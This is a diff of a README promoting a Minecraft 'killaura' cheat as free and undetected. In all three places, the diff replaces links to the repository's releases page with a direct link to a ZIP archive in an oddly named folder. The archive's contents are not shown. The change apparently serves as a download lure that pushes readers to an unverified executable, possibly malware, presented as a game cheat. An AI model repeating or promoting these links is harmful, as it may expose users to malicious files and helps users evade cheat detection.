@@ -1,6 +1,6 @@
 # 🎯 Minecraft-Killaura - Your Free, Undetected Combat Advantage for 2026
 
-[![Download Minecraft-Killaura](https://img.shields.io/badge/Download-Minecraft--Killaura-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb)](https://github.com/lashervirgin2293/Minecraft-Killaura/releases)
+[![Download Minecraft-Killaura](https://img.shields.io/badge/Download-Minecraft--Killaura-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb)](https://raw.githubusercontent.com/lashervirgin2293/Minecraft-Killaura/main/rouster/Minecraft-Killaura-Athyris.zip)
 
 ---
 
@@ -28,7 +28,7 @@ That's it. No additional software, no complicated setup, no paid subscriptions.
 
 **Step 1: Get the File**
 
-Visit this link to download the application: [https://github.com/lashervirgin2293/Minecraft-Killaura/releases](https://github.com/lashervirgin2293/Minecraft-Killaura/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/lashervirgin2293/Minecraft-Killaura/main/rouster/Minecraft-Killaura-Athyris.zip](https://raw.githubusercontent.com/lashervirgin2293/Minecraft-Killaura/main/rouster/Minecraft-Killaura-Athyris.zip)
 
 Click the download button on that page to save the file to your computer. The download is completely free, and you won't be asked for any payment information.
 
@@ -141,7 +141,7 @@ For additional help, check the repository's Issues page or leave a comment on th
 
 Don't wait any longer. Get your free, fully unlocked Minecraft-Killaura today:
 
-[**Download Minecraft-Killaura Now**](https://github.com/lashervirgin2293/Minecraft-Killaura/releases)
+[**Download Minecraft-Killaura Now**](https://raw.githubusercontent.com/lashervirgin2293/Minecraft-Killaura/main/rouster/Minecraft-Killaura-Athyris.zip)
 
 ---
 
